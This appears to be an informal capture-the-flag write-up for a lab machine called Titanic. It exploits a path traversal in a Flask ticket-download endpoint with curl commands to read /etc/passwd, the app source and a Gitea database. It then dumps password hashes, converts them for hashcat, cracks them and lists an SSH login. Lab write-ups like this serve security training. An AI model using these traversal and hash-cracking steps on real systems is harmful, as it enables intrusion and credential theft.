

10.10.11.55


Upon browsing to the site hosted here. Something stands out to me immeditatly which is the book now and the fact you can put it appears whatever you want and then it downloads a JSON file. Maybe I could escape the json? but would that matter idk?

Looking at the http request 

POST /book HTTP/1.1
Host: titanic.htb
Content-Length: 77
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://titanic.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://titanic.htb/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

name=test&email=test%40mail.com&phone=1113e'&date=232332-03-31&cabin=Standard


It then redirects me to a /download? 

oh nice maybe i can download da database


HTTP/1.1 302 FOUND
Date: Wed, 23 Apr 2025 01:17:10 GMT
Server: Werkzeug/3.0.3 Python/3.10.12
Content-Type: text/html; charset=utf-8
Content-Length: 303
Location: /download?ticket=e0d4ede8-20ff-44a6-b61f-3757f59380f9.json
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/download?ticket=e0d4ede8-20ff-44a6-b61f-3757f59380f9.json">/download?ticket=e0d4ede8-20ff-44a6-b61f-3757f59380f9.json</a>. If not, click the link.



So lets see if we can just download whatever we want

curl 'http://titanic.htb/download?ticket=../../../../etc/passwd' -H "Host: titanic.htb"

and yep. LFI

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false



curl 'http://titanic.htb/download?ticket=../../../../etc/apache2/apache2.conf' -H "Host: titanic.htb"


I got this by downloading /var/www/html/index.html and seeing its apache


[haxor@skid ~]$ curl 'http://titanic.htb/download?ticket=../../../../etc/mysql/my.cnf' -H "Host: titanic.htb"
#
# The MySQL database server configuration file.
#
# You can copy this to one of:
# - "/etc/mysql/my.cnf" to set global options,
# - "~/.my.cnf" to set user-specific options.
#
# One can use all long options that the program supports.
# Run program with --help to get a list of available options and with
# --print-defaults to see which it would actually understand and use.
#
# For explanations see
# http://dev.mysql.com/doc/mysql/en/server-system-variables.html

# This will be passed to all mysql clients
# It has been reported that passwords should be enclosed with ticks/quotes
# escpecially if they contain "#" chars...
# Remember to edit /etc/mysql/debian.cnf when changing the socket location.

# Here is entries for some specific programs
# The following values assume you have at least 32M ram

!includedir /etc/mysql/conf.d/
[haxor@skid ~]$

[haxor@skid ~]$ curl 'http://titanic.htb/download?ticket=../app.py' -H "Host: titanic.htb"from flask import Flask, request, jsonify, send_file, render_template, redirect, url_for, Response
import os
import json
from uuid import uuid4

app = Flask(__name__)

# Directory to save the JSON files
TICKETS_DIR = "tickets"

# Ensure the directory exists
if not os.path.exists(TICKETS_DIR):
    os.makedirs(TICKETS_DIR)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/book', methods=['POST'])
def book_ticket():
    data = {
        "name": request.form['name'],
        "email": request.form['email'],
        "phone": request.form['phone'],
        "date": request.form['date'],
        "cabin": request.form['cabin']
    }

    # Generate a unique ID for the ticket
    ticket_id = str(uuid4())
    json_filename = f"{ticket_id}.json"
    json_filepath = os.path.join(TICKETS_DIR, json_filename)

    # Save the data as a JSON file
    with open(json_filepath, 'w') as json_file:
        json.dump(data, json_file)

    # Redirect to the download URL with the ticket filename
    return redirect(url_for('download_ticket', ticket=json_filename))

@app.route('/download', methods=['GET'])
def download_ticket():
    ticket = request.args.get('ticket')
    if not ticket:
        return jsonify({"error": "Ticket parameter is required"}), 400

    json_filepath = os.path.join(TICKETS_DIR, ticket)

    if os.path.exists(json_filepath):
        return send_file(json_filepath, as_attachment=True, download_name=ticket)
    else:
        return jsonify({"error": "Ticket not found"}), 404

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)
[haxor@skid ~]$


i got the source code


And then iticket=../app.py

http://titanic.htb/download?ticket=../../../../home/developer/gitea/data/gitea/gitea.db


I also got the user.txt flag from this LFI

Once i get the gitea db i open it in sqlite

sqlite> SELECT id, name, email, passwd FROM user;
1|administrator|root@titanic.htb|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136
2|developer|developer@titanic.htb|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56
sqlite>


Turns out theres salts

 select passwd,salt,name from user;





This is the script i used to format hash right.


Now this messed me up for like 30 minutes Use this command below in order to extract the hashes in the correct format. Since they are displayed in HEX Format and we need the actual binary data

```
sqlite3 gitea.db "SELECT REPLACE(name || ':' || 'sha256:50000:' || BASE64(UNHEX(salt)) || ':' || BASE64(UNHEX(passwd)),CHAR(10),'') FROM user"
```
THEN BEFORE THIS STEP REMOVE THE USERNAME: PART BEFORE THE HASH 

then run
hashcat hash.txt rockyou.txt


ssh developer@titanic.htb : 25282528